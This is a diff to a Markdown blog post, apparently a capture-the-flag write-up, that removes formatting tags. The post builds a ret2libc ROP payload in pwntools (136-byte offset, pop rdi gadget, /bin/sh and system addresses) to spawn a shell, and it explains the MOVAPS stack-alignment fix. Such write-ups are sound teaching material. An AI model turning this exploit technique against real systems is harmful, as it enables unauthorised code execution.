@@ -76,7 +76,6 @@ log.success(f"/bin/sh @ {hex(binsh)}")
 system = get_symbol_addr("system")
 log.success(f"system @ {hex(system)}")
 ```
-{: .nolineno }
 
 As we have everything we need we can assemble our payload to get a shell! We know that the offset to the saved return address is 136 bytes. Inside `rdi` we need to put the address of `/bin/sh`, not the string itself! This is because the argument to the `system` function is the address where the string is located, not the string itself. Lastly, after we have set the `rdi` register to the address of `/bin/sh`, we call the `system` function.
 
@@ -87,7 +86,6 @@ payload += p64(pop_rdi) # "pop rdi; ret;" gadget
 payload += p64(binsh)   # Address where "/bin/sh" string is stored
 payload += p64(system)  # Address of "system" function
 ```
-{: .nolineno }
 
 Sending and triggering the payload should then call `system("/bin/sh")` for us, and give us shell!
 ```python
@@ -98,7 +96,6 @@ io.sendlineafter(b"> ", b"8")
 
 io.interactive()
 ```
-{: .nolineno }
 
 
 But it doesn't work... This is because of something called [The MOVAPS Issue](https://ropemporium.com/guide.html#common-pitfalls). TLDR; We need to put the call to system on a stack address ending in 0, not 8. Because we cannot reduce our payload with 8 bytes (we cannot remove the padding, because then we don't overwrite the return address as we want), we have to add 8 more bytes before we call system. The "standard" way to do this is to use another gadget: `ret;`. Luckily, this gadget is *everywhere* in binaries, so even though we are not given the explicit address of it in this challenge, we can still find it easily.
